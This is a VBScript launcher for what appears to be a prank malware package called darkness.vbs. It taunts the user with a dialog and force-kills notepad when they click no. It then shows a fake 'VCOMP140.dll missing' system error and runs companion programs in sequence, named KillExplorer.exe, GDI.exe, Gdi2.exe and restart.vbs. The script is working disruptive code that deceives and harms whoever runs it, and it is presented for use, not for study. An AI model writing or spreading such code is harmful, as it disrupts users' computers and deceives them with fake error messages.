Dim resposta

resposta = MsgBox("clicking yes, your computer will become a depression system," & vbCrLf & _
                  "if you are dark click yes ~-~ >< cutee !", vbExclamation + vbYesNo, "?")

If resposta = vbNo Then
    MsgBox "why :((", vbInformation, ">:("
    CreateObject("WScript.Shell").Run "cmd.exe /c taskkill /f /im notepad.exe", 0, True
End If

MsgBox "The program can't start because VCOMP140.dll is missing from your computer." & vbCrLf & _
       "Try reubstalling program to fix this problem.", _
       16, "darkness.vbs - System Error"

CreateObject("WScript.Shell").Run "notepad.txt"
WScript.Sleep 3000

Set objShell = CreateObject("WScript.Shell")
objShell.Run ".\img.vbs"
WScript.Sleep 2000

Set objShell = CreateObject("WScript.Shell")
objShell.Run ".\dance.vbs"

Set objShell = CreateObject("WScript.Shell")
objShell.Run ".\search.vbs"

Set objShell = CreateObject("WScript.Shell")
objShell.Run ".\KillExplorer.exe"

WScript.Sleep 30000

Set objShell = CreateObject("WScript.Shell")
objShell.Run ".\GDI.exe"

WScript.Sleep 25000

Set objShell = CreateObject("WScript.Shell")
objShell.Run ".\Gdi2.exe"

WScript.Sleep 30000

Set objShell = CreateObject("WScript.Shell")
objShell.Run ".\restart.vbs"